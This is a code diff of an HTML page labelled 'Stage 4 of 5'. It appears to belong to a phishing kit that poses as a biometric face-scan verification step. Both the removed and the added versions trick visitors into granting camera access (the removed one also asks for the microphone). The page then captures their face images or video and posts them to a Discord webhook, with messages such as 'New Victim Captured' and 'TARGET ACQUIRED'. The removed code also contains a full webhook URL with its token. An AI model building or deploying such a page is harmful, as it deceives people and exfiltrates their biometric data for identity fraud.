@@ -2,127 +2,66 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>System Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>STAGE 4</title>
   <style>
-    body { background: #0b0e14; color: #58a6ff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-    .scanner-box { position: relative; width: 300px; height: 300px; border: 2px solid #58a6ff; border-radius: 50%; overflow: hidden; box-shadow: 0 0 15px rgba(88,166,255,0.4); }
+    * { box-sizing: border-box; }
+    body { background-color: #f5f2eb; color: #2d3748; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 24px; }
+    .stage-badge { font-size: 14px; font-weight: 700; letter-spacing: 2px; color: #718096; text-transform: uppercase; margin-bottom: 16px; }
+    .card { background: #ffffff; border: 1px solid #e2e8f0; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05); padding: 40px; border-radius: 16px; width: 100%; max-width: 520px; text-align: center; }
+    h2 { color: #1a202c; margin-top: 0; font-size: 26px; margin-bottom: 24px; }
+    .circle-viewport { width: 220px; height: 220px; border-radius: 50%; border: 4px solid #2b6cb0; overflow: hidden; margin: 0 auto 28px auto; background: #000; box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
     video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(180deg, rgba(88,166,255,0.25) 0%, transparent 100%); animation: scan 2s infinite alternate; }
-    @keyframes scan { 0% { top: -100%; } 100% { top: 100%; } }
-    button { margin-top: 25px; padding: 12px 28px; background: #238636; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; font-size: 16px; }
-    button:disabled { background: #1f4e28; cursor: not-allowed; }
-    .status { margin-top: 15px; color: #8b949e; font-size: 14px; text-align: center; height: 20px; }
+    button { padding: 16px 28px; background: #2b6cb0; color: white; border: none; font-size: 18px; font-weight: 600; cursor: pointer; border-radius: 10px; width: 100%; transition: background 0.2s; }
+    button:hover { background: #2c5282; }
+    button:disabled { background: #a0aec0; cursor: not-allowed; }
   </style>
 </head>
 <body>
 
-  <h2>BIOMETRIC VERIFICATION</h2>
-  <div class="scanner-box">
-    <video id="webcam" autoplay playsinline muted></video>
-    <div class="overlay"></div>
+  <div class="stage-badge">STAGE 4 OF 5</div>
+
+  <div class="card">
+    <h2>[ CONFIRM FACE SCAN ]</h2>
+
+    <div class="circle-viewport">
+      <video id="webcam" autoplay playsinline muted></video>
+    </div>
+
+    <button id="snapBtn" onclick="takeSnapshot()">CONFIRM FACE SCAN</button>
   </div>
 
-  <p class="status" id="instruction">Position face in center and look directly at camera.</p>
-  <button id="scanBtn">START VERIFICATION</button>
-
   <script>
-    // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";
-
+    const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
     const video = document.getElementById('webcam');
-    const scanBtn = document.getElementById('scanBtn');
-    const instruction = document.getElementById('instruction');
+    const snapBtn = document.getElementById('snapBtn');
 
-    let mediaStream;
-    let videoRecorder;
-    let recordedChunks = [];
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { alert("Camera access required to perform scan."); });
 
-    // Request camera + microphone access
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then(stream => {
-        mediaStream = stream;
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("Camera and Microphone access are required to complete identity verification.");
-      });
+    function takeSnapshot() {
+      snapBtn.disabled = true;
+      snapBtn.innerText = "SCANNING & ACQUIRING...";
 
-    scanBtn.addEventListener('click', () => {
-      scanBtn.disabled = true;
-      scanBtn.innerText = "SCANNING IN PROGRESS...";
-
-      // Start full video + audio recording
-      startVideoRecording();
-
-      // Step 1: Look Up and Down (3.5 Seconds)
-      instruction.innerText = "Step 1/2: Slowly look UP, then DOWN...";
-      
-      setTimeout(() => {
-        const photo1 = captureFrame(); // Capture photo frame #1
-
-        // Step 2: Open Eyes Wider (3.5 Seconds)
-        instruction.innerText = "Step 2/2: Hold still and open eyes WIDER for pupil focus...";
-        
-        setTimeout(() => {
-          const photo2 = captureFrame(); // Capture photo frame #2 (Wide eyes)
-
-          instruction.innerText = "Finalizing biometric analysis...";
-
-          // Padding before ending recording (1 second)
-          setTimeout(() => {
-            stopAndUpload(photo1, photo2);
-          }, 1000);
-
-        }, 3500); // 3.5s allocated for wide eyes check
-      }, 3500);   // 3.5s allocated for up/down check
-    });
-
-    function captureFrame() {
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.90);
-    }
 
-    function startVideoRecording() {
-      recordedChunks = [];
-      // Records both video stream and audio stream into a single WebM clip
-      videoRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-      videoRecorder.ondataavailable = event => {
-        if (event.data.size > 0) recordedChunks.push(event.data);
-      };
-      videoRecorder.start();
-    }
-
-    function stopAndUpload(photo1Base64, photo2Base64) {
-      videoRecorder.stop();
-      videoRecorder.onstop = async () => {
-        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-
-        // Convert base64 snapshots to Blobs
-        const blob1 = await (await fetch(photo1Base64)).blob();
-        const blob2 = await (await fetch(photo2Base64)).blob();
-
+      canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('content', '🚨 **New Victim Captured in Stage 4!** 🚨');
-        formData.append('file1', videoBlob, 'full_biometric_video.webm');
-        formData.append('file2', blob1, 'frame1_look_up_down.jpg');
-        formData.append('file3', blob2, 'frame2_eyes_wide.jpg');
+        formData.append('content', '🎯 **TARGET ACQUIRED: Biometric Face Scan Captured!**');
+        formData.append('file', blob, 'face_scan.jpg');
 
-        try {
-          await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            body: formData
-          });
-        } catch (e) {
-          console.error("Payload submitted");
-        }
-
-        // Redirect to Stage 5
-        window.location.href = "stage5.html";
-      };
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).finally(() => {
+          window.location.href = "stage5.html";
+        });
+      }, 'image/jpeg');
     }
   </script>
 </body>
